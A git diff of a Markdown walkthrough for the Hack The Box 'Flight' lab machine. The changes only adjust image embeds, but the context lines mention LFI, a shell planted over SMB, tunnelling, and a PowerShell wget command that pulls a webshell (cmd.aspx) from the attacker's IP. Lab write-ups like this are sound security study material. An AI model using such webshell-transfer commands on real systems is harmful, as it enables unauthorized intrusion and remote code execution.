@@ -196,7 +196,7 @@ nuclei -u http://school.flight.htb/
 [caa-fingerprint] [dns] [info] school.flight.htb
 ```
 ### Website functionality
-![](Pasted%20image%2020260406003232.png)
+![849](Pasted%20image%2020260406003232.png)
 There is clearly some protection on this functionality when trying to get LFI
 
 # LFI in `school` subdomain
@@ -519,7 +519,7 @@ smb: \school.flight.htb\>
 ```
 This planted the shell now i can browse to it!
 
-![[Pasted image 20260331182147.png]]
+![](Pasted%20image%2020260406003259.png)
 As seen here i now have Remote Code Execution as this user
 
 Soon after though the shell is removed from the share probably a cleanup script
@@ -687,7 +687,7 @@ This shows me getting the connection and starting the tunnel
 
 Now if i go to `http://240.0.0.1:8000/` i should be able to access the internal service
 
-![[Pasted image 20260401155920.png|822]]
+![792](Pasted%20image%2020260406003315.png)
 I now have access to the internal service
 
 Now using my `c.bum` shell i can test out a shell by simply droping it in `development`
@@ -708,7 +708,7 @@ powershell -c wget http://10.10.14.90:1000/cmd.aspx -o cmd.aspx
 ```
 This transferred the file
 
-![[Pasted image 20260401162100.png]]
+![](Pasted%20image%2020260406003333.png)
 Now browsing to it i have a working webshell
 
 ![[Pasted image 20260401162751.png]]
